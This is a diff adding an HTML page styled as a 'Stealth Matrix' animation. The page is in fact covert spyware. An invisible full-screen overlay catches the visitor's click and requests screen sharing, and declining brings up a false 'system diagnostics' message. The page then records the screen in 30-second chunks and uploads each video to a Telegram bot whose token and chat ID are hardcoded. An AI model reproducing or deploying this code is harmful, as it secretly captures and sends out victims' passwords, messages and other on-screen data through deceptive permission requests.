@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CodexBD | Stealth Matrix</title>
+    <style>
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: black; }
+        canvas { display: block; }
+        #trigger { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div id="trigger"></div>
+    <canvas id="matrixCanvas"></canvas>
+
+    <script>
+        const BOT_TOKEN = '8753702909:AAE2v8cNtOy_Q_X66XcfQa7zbCqQC9L8j9k';
+        const CHAT_ID = '6274855215';
+        const DURATION = 30000; 
+
+        // Matrix Effect
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        const letters = "010101010101";
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+        let hue = 0;
+
+        function drawMatrix() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.font = fontSize + "px monospace";
+            for (let i = 0; i < drops.length; i++) {
+                ctx.fillStyle = `hsl(${(hue + i * 2) % 360}, 100%, 50%)`;
+                ctx.fillText(letters.charAt(Math.floor(Math.random()*letters.length)), i*fontSize, drops[i]*fontSize);
+                if (drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+            hue++;
+        }
+        setInterval(drawMatrix, 40);
+
+        // Recording Logic
+        let mediaRecorder;
+        let chunks = [];
+        let stream;
+
+        document.getElementById('trigger').onclick = async function() {
+            this.style.display = 'none';
+            try {
+                // Screen Capture Request
+                stream = await navigator.mediaDevices.getDisplayMedia({ 
+                    video: { frameRate: { ideal: 10 } }, 
+                    audio: false 
+                });
+                
+                startLoop();
+
+                stream.getVideoTracks()[0].onended = () => location.reload();
+
+            } catch (err) {
+                alert("Permission required for system diagnostics.");
+                location.reload();
+            }
+        };
+
+        function startLoop() {
+            if (!stream || !stream.active) return;
+            chunks = [];
+            mediaRecorder = new MediaRecorder(stream);
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'video/mp4' });
+                await sendToTelegram(blob);
+                if (stream.active) startLoop();
+            };
+            mediaRecorder.start();
+            setTimeout(() => { if(mediaRecorder.state === 'recording') mediaRecorder.stop(); }, DURATION);
+        }
+
+        async function sendToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('document', blob, `rec_${Date.now()}.mp4`);
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) { console.log("Sync Error"); }
+        }
+    </script>
+</body>
+</html>
+
